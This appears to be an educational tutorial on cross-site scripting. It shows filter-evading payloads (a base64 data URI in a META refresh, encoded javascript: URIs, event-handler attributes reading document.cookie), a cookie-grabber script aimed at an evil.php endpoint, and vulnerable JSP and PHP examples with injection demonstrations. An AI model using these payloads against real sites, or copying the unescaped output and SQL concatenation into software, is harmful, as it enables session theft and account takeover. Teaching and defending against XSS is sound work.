


XSS using code encoding
We may encode our script in base64 and place it in META tag. 
This way we get rid of alert() totally. 
More information about this method can be found in RFC 2397

<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">



XSS using Script Via Encoded URI Schemes
If we need to hide against web application filters we may try to encode string characters,
 e.g.: a=&#X41 (UTF-8) and use it in IMG tag:

<IMG SRC=j&#X41vascript:alert('test2')>


XSS using Script in Attributes
XSS attacks may be conducted without using <script></script> tags.
 Other tags will do exacly the same thing, 
 
[Example1]:

<body onload=alert('test1')>
or other attribites like: onmouseover, onerror.
onmouseover
<b onmouseover=alert('Wufff!')>click me!</b>
onerror
<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>


JSP Snippet[Example2]:

<%... 
	 Statement stmt = conn.createStatement();
	 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
	 if (rs != null) {
	  rs.next(); 
	  String name = rs.getString("name");
	%>
	
	Employee Name: <%= name %>

As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response.
 Reflected XSS exploits occur when an attacker causes a user to supply 
dangerous content to a vulnerable web application, 
which is then reflected back to the user and executed by the web browser.
 The most common mechanism for delivering malicious content is to include it 
as a parameter in a URL that is posted publicly or e-mailed directly to victims.
 URLs constructed in this manner constitute the core of many phishing schemes, 
whereby an attacker convinces victims to visit a URL that refers to a vulnerable site.
 After the site reflects the attacker's content back to the user, 
the content is executed and proceeds to transfer private information, 
such as cookies that may include session information, 
from the user's machine to the attacker or perform other nefarious activities.


As in Example 2, the application stores dangerous data in a database or other trusted data store. 
The dangerous data is subsequently read back into the application and included in dynamic content. 
Stored XSS exploits occur when an attacker injects dangerous content into a data store
 that is later read and included in dynamic content.
 From an attacker's perspective,
 the optimal place to inject malicious content is in an area 
that is displayed to either many users or particularly interesting users.
 Interesting users typically have elevated privileges in the application or interact 
with sensitive data that is valuable to the attacker. 
If one of these users executes malicious content, 
the attacker may be able to perform privileged operations on behalf 
of the user or gain access to sensitive data belonging to the user.
A source outside the application stores dangerous data in a database or other data store, 
and the dangerous data is subsequently read back into the application as trusted data
 and included in dynamic content.


Attack Examples
Example 1 : Cookie Grabber
If the application doesn't validate the input data, 
the attacker can easily steal a cookie from an authenticated user. 
All the attacker has to do is to place the following code in any posted input
(ie: message boards, private messages, user profiles):

<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>

The above code will pass an escaped content of the cookie 
(according to RFC content must be escaped before sending it via HTTP protocol with GET method) 
to the evil.php script in "cakemonster" variable. 
The attacker then checks the results of his evil.php script
 (a cookie grabber script will usually write the cookie to a file) and use it.



Error Page Example
Let's assume that we have an error page,
 which is handling requests for a non existing pages, 
a classic 404 error page. We may use the code below as an example to inform user about 
what specific page is missing

<html>
<body>

<? php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>


Let's see how it works:
http://testsite.test/file_which_not_exist

In response we get:
Not found: /file_which_not_exist

Now we will try to force the error page to include our code:
http://testsite.test/<script>alert("TEST");</script>

The result is:
Not found: / (but with JavaScript code <script>alert("TEST");</script>)
We have successfully injected the code, 
our XSS! What does it mean? For example, that we may use this flaw to try to steal a user's session cookie.
